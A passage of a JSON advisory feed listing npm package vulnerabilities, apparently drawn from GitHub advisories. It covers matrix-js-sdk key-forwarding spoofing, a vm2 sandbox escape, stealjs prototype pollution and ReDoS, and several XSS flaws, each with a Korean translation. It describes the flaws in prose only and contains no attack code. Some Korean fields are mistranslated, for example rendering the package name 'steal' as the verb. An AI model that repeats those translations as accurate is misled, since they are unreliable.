    "description": "## Impact\n\nAn attacker cooperating with a malicious homeserver can construct messages appearing to have come from another person. Such messages will be marked with a grey shield on some platforms, but this may be missing in others.\n\nThis attack is possible due to the matrix-js-sdk implementing a too permissive [key forwarding](https://spec.matrix.org/v1.3/client-server-api/#key-requests) strategy on the receiving end.\n\nKey forwarding is a mechanism allowing clients to recover from “unable to decrypt” messages when they missed the initial key distribution, at the time the message was originally sent. Examples include accessing message history before they joined the room but also when some network/federation errors have occurred.\n\n## Patches\n\nThe default policy for accepting key forwards has been made more strict in the matrix-js-sdk. matrix-js-sdk will now only accept forwarded keys in response to previously issued requests and only from own, verified devices.\n\nA unique exception to this rule is with the experimental [MSC3061](https://github.com/matrix-org/matrix-spec-proposals/pull/3061), that is forwarding room keys for past messages when invited in a room configured with the proper history visibility setting. Such key forwards are parked upon receipt and are only accepted if the SDK receives an invitation for that room from the inviter in a limited time window.\n\nThe SDK now sets a `trusted` flag on the decrypted message upon decryption, based on whether the key used to decrypt the message was received from a trusted source. Clients need to ensure that messages decrypted with a key with `trusted = false` are decorated appropriately (for example, by showing a warning for such messages).\n\n### Workarounds\n\nAs this attack requires coordination between a malicious homeserver and an attacker, if you trust your homeserver, no particular workaround is needed.\n\n## References\nBlog post: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n## For more information\nIf you have any questions or comments about this advisory, e-mail us at security@matrix.org.",
    "identifiers": "GHSA : GHSA-6263-x97c-c4gg\nCVE : CVE-2022-39249",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:02:54Z",
    "publishedAt": "2022-09-30T00:40:35Z",
    "references": "https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-6263-x97c-c4gg\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39249\nhttps://github.com/matrix-org/matrix-spec-proposals/pull/3061\nhttps://github.com/matrix-org/matrix-js-sdk/commit/a587d7c36026fe1fcf93dfff63588abee359be76\nhttps://github.com/matrix-org/matrix-js-sdk/releases/tag/v19.7.0\nhttps://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\nhttps://security.gentoo.org/glsa/202210-35\nhttps://github.com/advisories/GHSA-6263-x97c-c4gg",
    "name": "matrix-js-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 19.7.0",
    "identifier": "19.7.0",
    "descriptionKR": "## 영향\n\n악의적인 홈 서버와 협력하는 공격자는 다른 사람이 보낸 것처럼 보이는 메시지를 구성할 수 있습니다. 이러한 메시지는 일부 플랫폼에서는 회색 방패로 표시되지만 다른 플랫폼에서는 표시되지 않을 수 있습니다.\n\n이 공격은 수신에서 너무 관대한 [키 전달](https://spec.matrix.org/v1.3/client-server-api/#key-requests) 전략을 구현하는 matrix-js-sdk로 인해 가능합니다. 끝.\n\n키 전달은 메시지가 원래 전송된 시점에 클라이언트가 초기 키 배포를 놓친 경우 \"암호 해독할 수 없음\" 메시지에서 복구할 수 있도록 하는 메커니즘입니다. 예를 들어 방에 참여하기 전에 메시지 기록에 액세스하는 것뿐만 아니라 일부 네트워크/페더레이션 오류가 발생한 경우에도 액세스할 수 있습니다.\n\n## 패치\n\n키 전달을 수락하기 위한 기본 정책은 matrix-js-sdk에서 더욱 엄격해졌습니다. 이제 matrix-js-sdk는 이전에 발행된 요청에 대한 응답으로 전달된 키만 허용하고 검증된 자체 장치에서만 허용합니다.\n\n이 규칙에 대한 고유한 예외는 실험적인 [MSC3061](https://github.com/matrix-org/matrix-spec-proposals/pull/3061)에서 방에 초대되었을 때 과거 메시지에 대한 방 키를 전달하는 것입니다. 적절한 기록 가시성 설정으로 구성되었습니다. 이러한 키 전달은 수신 시 보류되며 SDK가 제한된 시간 창에서 초대자로부터 해당 방에 대한 초대를 수신하는 경우에만 수락됩니다.\n\n이제 SDK는 메시지를 해독하는 데 사용된 키가 신뢰할 수 있는 소스에서 수신되었는지 여부에 따라 해독 시 해독된 메시지에 'trusted' 플래그를 설정합니다. 클라이언트는 'trusted = false' 키로 해독된 메시지가 적절하게 장식되도록 해야 합니다(예: 해당 메시지에 대한 경고 표시).\n\n### 해결 방법\n\n이 공격은 악의적인 홈 서버와 공격자 간의 조정이 필요하므로 홈 서버를 신뢰하는 경우 특별한 해결 방법이 필요하지 않습니다.\n\n## 참조\n블로그 게시물: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n## 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 security@matrix.org로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nImproperly formed beacon events (from [MSC3488](https://github.com/matrix-org/matrix-spec-proposals/pull/3488)) can disrupt or impede the matrix-js-sdk from functioning properly, potentially impacting the consumer's ability to process data safely. Note that the matrix-js-sdk can appear to be operating normally but be excluding or corrupting runtime data presented to the consumer.\n\n### Patches\nThis is patched in matrix-js-sdk v19.7.0\n\n### Workarounds\nRedacting applicable events, waiting for the sync processor to store data, and restarting the client can often fix it. Alternatively, redacting the applicable events and clearing all storage will fix the further perceived issues.\n\nDowngrading to an unaffected version, noting that such a version may be subject to other vulnerabilities, will additionally resolve the issue.\n\n### References\nN/A - This was a logic error in the SDK.\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [security at matrix.org](mailto:security@matrix.org).\n",
    "identifiers": "GHSA : GHSA-hvv8-5v86-r45x\nCVE : CVE-2022-39236",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:02:53Z",
    "publishedAt": "2022-09-29T14:36:38Z",
    "references": "https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-hvv8-5v86-r45x\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39236\nhttps://github.com/matrix-org/matrix-spec-proposals/pull/3488\nhttps://github.com/matrix-org/matrix-js-sdk/commit/a587d7c36026fe1fcf93dfff63588abee359be76\nhttps://github.com/matrix-org/matrix-js-sdk/releases/tag/v19.7.0\nhttps://security.gentoo.org/glsa/202210-35\nhttps://github.com/advisories/GHSA-hvv8-5v86-r45x",
    "name": "matrix-js-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 17.1.0-rc.1, < 19.7.0",
    "identifier": "19.7.0",
    "descriptionKR": "### 영향\n잘못 구성된 비콘 이벤트([MSC3488](https://github.com/matrix-org/matrix-spec-proposals/pull/3488)에서)는 matrix-js-sdk가 제대로 작동하는 것을 방해하거나 방해하여 잠재적으로 데이터를 안전하게 처리하는 소비자의 능력. matrix-js-sdk는 정상적으로 작동하는 것처럼 보일 수 있지만 소비자에게 제공되는 런타임 데이터를 제외하거나 손상시킬 수 있습니다.\n\n### 패치\n이것은 matrix-js-sdk v19.7.0에서 패치되었습니다.\n\n### 해결 방법\n적용 가능한 이벤트를 수정하고, 동기화 프로세서가 데이터를 저장하기를 기다리고, 클라이언트를 다시 시작하면 종종 문제를 해결할 수 있습니다. 또는 해당 이벤트를 수정하고 모든 저장소를 지우면 추가로 감지된 문제가 수정됩니다.\n\n영향을 받지 않는 버전으로 다운그레이드하고 해당 버전에 다른 취약점이 있을 수 있다는 점에 유의하면 추가로 문제가 해결됩니다.\n\n### 참조\nN/A - SDK의 논리 오류입니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 [security at matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "The d3-color module provides representations for various color spaces in the browser. Versions prior to 3.1.0 are vulnerable to a Regular expression Denial of Service. This issue has been patched in version 3.1.0. There are no known workarounds.",
    "identifiers": "GHSA : GHSA-36jr-mh4h-2g58",
    "severity": "HIGH",
    "updatedAt": "2023-01-13T05:04:43Z",
    "publishedAt": "2022-09-29T14:12:55Z",
    "references": "https://github.com/d3/d3-color/pull/100\nhttps://github.com/d3/d3-color/releases/tag/v3.1.0\nhttps://security.snyk.io/vuln/SNYK-JS-D3COLOR-1076592\nhttps://github.com/advisories/GHSA-36jr-mh4h-2g58",
    "name": "d3-color",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.1.0",
    "identifier": "3.1.0",
    "descriptionKR": "d3-color 모듈은 브라우저에서 다양한 색상 공간에 대한 표현을 제공합니다. 3.1.0 이전 버전은 정규식 서비스 거부에 취약합니다. 이 문제는 버전 3.1.0에서 패치되었습니다. 알려진 해결 방법이 없습니다."
  },
  {
    "description": "### Impact\nA threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.11` of `vm2`\n\n### Workarounds\nNone. \n\n### References\nGithub Issue - https://github.com/patriksimek/vm2/issues/467\nThe file that was patched - https://github.com/patriksimek/vm2/blob/master/lib/setup-sandbox.js#L71\nThe commit with the patch - https://github.com/patriksimek/vm2/commit/d9a7f3cc995d3d861e1380eafb886cb3c5e2b873#diff-b1a515a627d820118e76d0e323fe2f0589ed50a1eacb490f6c3278fe3698f164\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\n \n",
    "identifiers": "GHSA : GHSA-mrgp-mrhc-5jrq\nCVE : CVE-2022-36067",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:07:09Z",
    "publishedAt": "2022-09-28T13:09:01Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-mrgp-mrhc-5jrq\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36067\nhttps://github.com/patriksimek/vm2/issues/467\nhttps://github.com/patriksimek/vm2/commit/d9a7f3cc995d3d861e1380eafb886cb3c5e2b873#diff-b1a515a627d820118e76d0e323fe2f0589ed50a1eacb490f6c3278fe3698f164\nhttps://github.com/patriksimek/vm2/blob/master/lib/setup-sandbox.js#L71\nhttps://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067\nhttps://security.netapp.com/advisory/ntap-20221017-0002/\nhttps://github.com/advisories/GHSA-mrgp-mrhc-5jrq",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.9.11",
    "identifier": "3.9.11",
    "descriptionKR": "### 영향\n공격자는 샌드박스 보호를 우회하여 샌드박스를 실행하는 호스트에서 원격 코드 실행 권한을 얻을 수 있습니다.\n\n### 패치\n이 취약점은 `vm2` 버전 `3.9.11` 릴리스에서 패치되었습니다.\n\n### 해결 방법\n없음.\n\n### 참조\nGithub 문제 - https://github.com/patriksimek/vm2/issues/467\n패치된 파일 - https://github.com/patriksimek/vm2/blob/master/lib/setup-sandbox.js#L71\n패치 커밋 - https://github.com/patriksimek/vm2/commit/d9a7f3cc995d3d861e1380eafb886cb3c5e2b873#diff-b1a515a627d820118e76d0e323fe2f0589ed50a1eacb490f6c3278fe369 8f164\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [VM2](https://github.com/patriksimek/vm2)에서 이슈 열기"
  },
  {
    "description": "The secp256k1-js package before 1.1.0 for Node.js implements ECDSA without required r and s validation, leading to signature forgery.",
    "identifiers": "GHSA : GHSA-q3f4-9h4p-vgr3\nCVE : CVE-2022-41340",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:08:36Z",
    "publishedAt": "2022-09-25T00:00:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41340\nhttps://github.com/lionello/secp256k1-js/issues/11\nhttps://github.com/lionello/secp256k1-js/commit/302800f0370b42e360a33774bb808274ac729c2e\nhttps://github.com/lionello/secp256k1-js/compare/1.0.1...1.1.0\nhttps://www.npmjs.com/package/@lionello/secp256k1-js\nhttps://github.com/advisories/GHSA-q3f4-9h4p-vgr3",
    "name": "@lionello/secp256k1-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.0",
    "identifier": "1.1.0",
    "descriptionKR": "Node.js용 1.1.0 이전의 secp256k1-js 패키지는 필수 r 및 s 유효성 검사 없이 ECDSA를 구현하여 서명 위조로 이어집니다."
  },
  {
    "description": "This affects the package pac-resolver before 5.0.0. This can occur when used with untrusted input, due to unsafe PAC file handling. **NOTE:** The fix for this vulnerability is applied in the node-degenerator library, a dependency written by the same maintainer.",
    "identifiers": "GHSA : GHSA-9j49-mfvp-vmhm\nCVE : CVE-2021-23406",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:01:35Z",
    "publishedAt": "2021-09-02T17:10:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23406\nhttps://github.com/TooTallNate/node-degenerator/commit/9d25bb67d957bc2e5425fea7bf7a58b3fc64ff9e\nhttps://github.com/TooTallNate/node-degenerator/commit/ccc3445354135398b6eb1a04c7d27c13b833f2d5\nhttps://github.com/TooTallNate/node-pac-resolver/releases/tag/5.0.0\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1568506\nhttps://snyk.io/vuln/SNYK-JS-PACRESOLVER-1564857\nhttps://github.com/advisories/GHSA-9j49-mfvp-vmhm",
    "name": "degenerator",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.1",
    "identifier": "3.0.1",
    "descriptionKR": "이것은 5.0.0 이전 패키지 pac-resolver에 영향을 미칩니다. 이는 안전하지 않은 PAC 파일 처리로 인해 신뢰할 수 없는 입력과 함께 사용될 때 발생할 수 있습니다. **참고:** 이 취약점에 대한 수정 사항은 동일한 관리자가 작성한 종속 항목인 노드 퇴화자 라이브러리에 적용됩니다."
  },
  {
    "description": "Versions of `default-deep` before 0.2.4 are vulnerable to prototype pollution\n\n\n## Recommendation\n\nUpdate to version 0.2.4 or later.",
    "identifiers": "GHSA : GHSA-cqp5-m4pq-gfgp\nCVE : CVE-2018-3723",
    "severity": "LOW",
    "updatedAt": "2023-01-11T05:00:48Z",
    "publishedAt": "2018-07-26T15:18:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-3723\nhttps://hackerone.com/reports/310514\nhttps://github.com/advisories/GHSA-cqp5-m4pq-gfgp\nhttps://www.npmjs.com/advisories/581\nhttps://github.com/jonschlinkert/defaults-deep/commit/c873f341327ad885ff4d0f23b3d3bca31b0343e5",
    "name": "defaults-deep",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.4",
    "identifier": "0.2.4",
    "descriptionKR": "0.2.4 이전의 `default-deep` 버전은 프로토타입 오염에 취약합니다.\n\n\n## 추천\n\n버전 0.2.4 이상으로 업데이트하십시오."
  },
  {
    "description": "Toast UI Grid is a component to display and edit data. Versions prior to 4.21.3 are vulnerable to cross-site scripting attacks when pasting specially crafted content into editable cells. This issue was fixed in version 4.21.3. There are no known workarounds.",
    "identifiers": "GHSA : GHSA-9rwj-9j2h-fhvm\nCVE : CVE-2022-23458",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:04:14Z",
    "publishedAt": "2022-09-23T00:00:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-23458\nhttps://github.com/nhn/tui.grid/commit/e9db5968675ae113c07efc091cce210f2b26854f\nhttps://securitylab.github.com/advisories/GHSL-2022-029_nhn_tui_grid/\nhttps://github.com/advisories/GHSA-9rwj-9j2h-fhvm",
    "name": "tui-grid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.21.3",
    "identifier": "4.21.3",
    "descriptionKR": "Toast UI Grid는 데이터를 표시하고 편집하는 구성 요소입니다. 4.21.3 이전 버전은 특별히 제작된 콘텐츠를 편집 가능한 셀에 붙여넣을 때 교차 사이트 스크립팅 공격에 취약합니다. 이 문제는 버전 4.21.3에서 수정되었습니다. 알려진 해결 방법이 없습니다."
  },
  {
    "description": "Prototype pollution vulnerability in function convertLater in npm-convert.js in stealjs steal 2.2.4 via the packageName variable in npm-convert.js.",
    "identifiers": "GHSA : GHSA-gvjw-8mmr-8f6g\nCVE : CVE-2022-37258",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:03:59Z",
    "publishedAt": "2022-09-17T00:00:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37258\nhttps://github.com/stealjs/steal/issues/1527\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/npm-convert.js#L362\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/npm-convert.js#L369\nhttps://github.com/advisories/GHSA-gvjw-8mmr-8f6g",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "npm-convert.js의 packageName 변수를 통해 stealjs에서 npm-convert.js의 convertLater 함수에 있는 프로토타입 오염 취약성이 2.2.4를 훔칩니다."
  },
  {
    "description": "An XSS issue was discovered in tooltip/tooltip.js in PrimeTek PrimeFaces 7.0.11. In a web application using PrimeFaces, an attacker can provide JavaScript code in an input field whose data is later used as a tooltip title without any input validation.",
    "identifiers": "GHSA : GHSA-fw5f-7c6c-3vmv\nCVE : CVE-2020-10544",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:05:46Z",
    "publishedAt": "2021-05-07T16:16:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-10544\nhttps://github.com/primefaces/primefaces/issues/5642\nhttps://github.com/primefaces/primefaces/commit/9982c4f7a83f75e3ab06168fa283e3d6128dfd1f\nhttps://github.com/advisories/GHSA-fw5f-7c6c-3vmv",
    "name": "primefaces",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.0",
    "identifier": "8.0",
    "descriptionKR": "PrimeTek PrimeFaces 7.0.11의 tooltip/tooltip.js에서 XSS 문제가 발견되었습니다. PrimeFaces를 사용하는 웹 애플리케이션에서 공격자는 입력 유효성 검사 없이 나중에 데이터가 도구 설명 제목으로 사용되는 입력 필드에 JavaScript 코드를 제공할 수 있습니다."
  },
  {
    "description": "A URL parsing issue in goog.uri of the Google Closure Library versions up to and including v20200224 allows an attacker to send malicious URLs to be parsed by the library and return the wrong authority. Mitigation -- update your library to version v20200315.",
    "identifiers": "GHSA : GHSA-vh5w-fg69-rc8m\nCVE : CVE-2020-8910",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:05:46Z",
    "publishedAt": "2021-05-07T16:06:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-8910\nhttps://github.com/google/closure-library/commit/294fc00b01d248419d8f8de37580adf2a0024fc9\nhttps://github.com/google/closure-library/releases/tag/v20200315\nhttps://github.com/advisories/GHSA-vh5w-fg69-rc8m",
    "name": "google-closure-library",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 20200224.0.0",
    "identifier": "20200315.0.0",
    "descriptionKR": "v20200224까지 Google Closure Library 버전의 goog.uri에 있는 URL 구문 분석 문제로 인해 공격자가 라이브러리에서 구문 분석할 악성 URL을 보내고 잘못된 권한을 반환할 수 있습니다. 완화 -- 라이브러리를 버전 v20200315로 업데이트합니다."
  },
  {
    "description": "### Impact\n\nBy sending specially crafted headers an attacker can bypass the source image domain allowlist, causing the handler to load and return arbitrary images. Because the response is cached globally, this image will then be served to visitors without requiring those headers to be set. XSS can be achieved by requesting a malicious SVG with embedded scripts, which would then be served from the site domain. Note that this does not apply to images loaded in `<img>` tags, as scripts do not execute in this context. The image URL can be set in the header independently of the request URL, meaning any site images that have not previously been cached can have their cache poisoned.\n\n### Patches\nThis problem has been fixed in version 1.2.3\n\n### Workarounds\n\nThe problem is no longer exploitable on Netlify as the CDN now sanitizes the relevant header. Cached content can be cleared by re-deploying the site.\n",
    "identifiers": "GHSA : GHSA-9jjv-524m-jm98\nCVE : CVE-2022-39239",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:51Z",
    "publishedAt": "2022-09-21T21:42:01Z",
    "references": "https://github.com/netlify/netlify-ipx/security/advisories/GHSA-9jjv-524m-jm98\nhttps://github.com/netlify/netlify-ipx/pull/61\nhttps://github.com/netlify/netlify-ipx/commit/dfa7505a8d47a76fd527570dc40737a61500759b\nhttps://github.com/netlify/netlify-ipx/releases/tag/v1.2.3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39239\nhttps://github.com/advisories/GHSA-9jjv-524m-jm98",
    "name": "@netlify/ipx",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.3",
    "identifier": "1.2.3",
    "descriptionKR": "### 영향\n\n특별히 제작된 헤더를 전송함으로써 공격자는 원본 이미지 도메인 허용 목록을 우회하여 핸들러가 임의의 이미지를 로드하고 반환하도록 할 수 있습니다. 응답이 전역적으로 캐시되기 때문에 이 이미지는 해당 헤더를 설정하지 않고도 방문자에게 제공됩니다. XSS는 포함된 스크립트가 포함된 악성 SVG를 요청하여 달성할 수 있으며, 그런 다음 사이트 도메인에서 제공됩니다. 스크립트는 이 컨텍스트에서 실행되지 않으므로 `<img>` 태그에 로드된 이미지에는 적용되지 않습니다. 이미지 URL은 요청 URL과 독립적으로 헤더에 설정할 수 있습니다. 즉, 이전에 캐시되지 않은 사이트 이미지에 캐시가 중독될 수 있습니다.\n\n### 패치\n이 문제는 버전 1.2.3에서 수정되었습니다.\n\n### 해결 방법\n\n이제 CDN이 관련 헤더를 삭제하므로 Netlify에서 더 이상 문제를 악용할 수 없습니다. 캐시된 콘텐츠는 사이트를 재배포하여 지울 수 있습니다."
  },
  {
    "description": "Prototype pollution vulnerability in stealjs steal via the alias variable in babel.js.",
    "identifiers": "GHSA : GHSA-wc4x-qmr2-rj8h\nCVE : CVE-2022-37265",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:04:31Z",
    "publishedAt": "2022-09-21T00:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37265\nhttps://github.com/stealjs/steal/issues/1534\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/babel.js#L4216\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/babel.js#L4569\nhttps://github.com/advisories/GHSA-wc4x-qmr2-rj8h",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "stealjs의 프로토타입 오염 취약성은 babel.js의 별칭 변수를 통해 훔칩니다."
  },
  {
    "description": "A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal 2.2.4 via the string variable in babel.js.",
    "identifiers": "GHSA : GHSA-rgqx-226f-2xp4\nCVE : CVE-2022-37259",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:04:12Z",
    "publishedAt": "2022-09-21T00:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37259\nhttps://github.com/stealjs/steal/issues/1528\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/babel.js#L54124\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/babel.js#L54129\nhttps://github.com/advisories/GHSA-rgqx-226f-2xp4",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "babel.js의 문자열 변수를 통해 Stealjs 2.2.4에서 ReDoS(정규식 서비스 거부) 결함이 발견되었습니다."
  },
  {
    "description": "Prototype pollution vulnerability in function convertLater in npm-convert.js in stealjs steal via the requestedVersion variable in the npm-convert.js file.",
    "identifiers": "GHSA : GHSA-93q5-3xpc-8vg3\nCVE : CVE-2022-37257",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:02:53Z",
    "publishedAt": "2022-09-16T00:00:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37257\nhttps://github.com/stealjs/steal/issues/1526\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/npm-convert.js#L362\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/npm-convert.js#L371\nhttps://github.com/advisories/GHSA-93q5-3xpc-8vg3",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "npm-convert.js 파일의 requiredVersion 변수를 통해 stealjs 도용의 npm-convert.js에 있는 convertLater 함수의 프로토타입 오염 취약성."
  },
  {
    "description": "Prototype pollution vulnerability in function extend in babel.js in stealjs steal via the key variable in babel.js.",
    "identifiers": "GHSA : GHSA-vwhq-pm3r-fjm9\nCVE : CVE-2022-37266",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:02:53Z",
    "publishedAt": "2022-09-16T00:00:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37266\nhttps://github.com/stealjs/steal/issues/1535\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/babel.js#L29165\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/ext/babel.js#L29169\nhttps://github.com/advisories/GHSA-vwhq-pm3r-fjm9",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "함수의 프로토타입 오염 취약성은 babel.js의 키 변수를 통해 stealjs에서 babel.js로 확장됩니다."
  },
  {
    "description": "A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal via the source and sourceWithComments variable in main.js.",
    "identifiers": "GHSA : GHSA-28v4-jf82-jvj8\nCVE : CVE-2022-37262",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:02:52Z",
    "publishedAt": "2022-09-16T00:00:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37262\nhttps://github.com/stealjs/steal/issues/1531\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/main.js#L3497\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/main.js#L3507\nhttps://github.com/advisories/GHSA-28v4-jf82-jvj8",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "정규식 서비스 거부(ReDoS) 결함이 main.js의 소스 및 sourceWithComments 변수를 통한 stealjs 도용에서 발견되었습니다."
  },
  {
    "description": "Prototype pollution vulnerability in stealjs steal 2.2.4 via the optionName variable in main.js.",
    "identifiers": "GHSA : GHSA-8f8g-9j73-7p82\nCVE : CVE-2022-37264",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:02:44Z",
    "publishedAt": "2022-09-16T00:00:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37264\nhttps://github.com/stealjs/steal/issues/1533\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/main.js#L2194\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/main.js#L647\nhttps://github.com/advisories/GHSA-8f8g-9j73-7p82",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "Stealjs의 프로토타입 오염 취약성은 main.js의 optionName 변수를 통해 2.2.4를 훔칩니다."
  },
  {
    "description": "A Regular Expression Denial of Service (ReDoS) flaw was found in stealjs steal via the input variable in main.js.",
    "identifiers": "GHSA : GHSA-7f3x-2wcx-hww8\nCVE : CVE-2022-37260",
    "severity": "LOW",
    "updatedAt": "2023-01-30T05:02:54Z",
    "publishedAt": "2022-09-16T00:00:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37260\nhttps://github.com/stealjs/steal/issues/1529\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/main.js#L2490\nhttps://github.com/stealjs/steal/blob/c9dd1eb19ed3f97aeb93cf9dcea5d68ad5d0ced9/main.js#L3344\nhttps://github.com/advisories/GHSA-7f3x-2wcx-hww8",
    "name": "steal",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "정규식 서비스 거부(ReDoS) 결함이 main.js의 입력 변수를 통한 stealjs 훔치기에서 발견되었습니다."
  },
  {
    "description": "The package vuetify from 2.0.0-beta.4 and before 2.6.10 are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization in the 'eventName' function within the VCalendar component.",
    "identifiers": "GHSA : GHSA-q4q5-c5cv-2p68\nCVE : CVE-2022-25873",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:03:33Z",
    "publishedAt": "2022-09-19T00:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25873\nhttps://github.com/vuetifyjs/vuetify/issues/15757\nhttps://github.com/vuetifyjs/vuetify/commit/ade1434927f55a0eccf3d54f900f24c5fa85a176\nhttps://codepen.io/5v3n-08/pen/MWGKEjY\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBVUETIFYJS-3024407\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3024406\nhttps://security.snyk.io/vuln/SNYK-JS-VUETIFY-3019858\nhttps://github.com/advisories/GHSA-q4q5-c5cv-2p68",
    "name": "vuetify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0-beta.4, < 2.6.10",
    "identifier": "2.6.10",
    "descriptionKR": "vuetify 2.0.0-beta.4 및 2.6.10 이전 패키지는 VCalendar 구성 요소 내 'eventName' 함수의 부적절한 입력 삭제로 인해 XSS(교차 사이트 스크립팅)에 취약합니다."
  },
  {
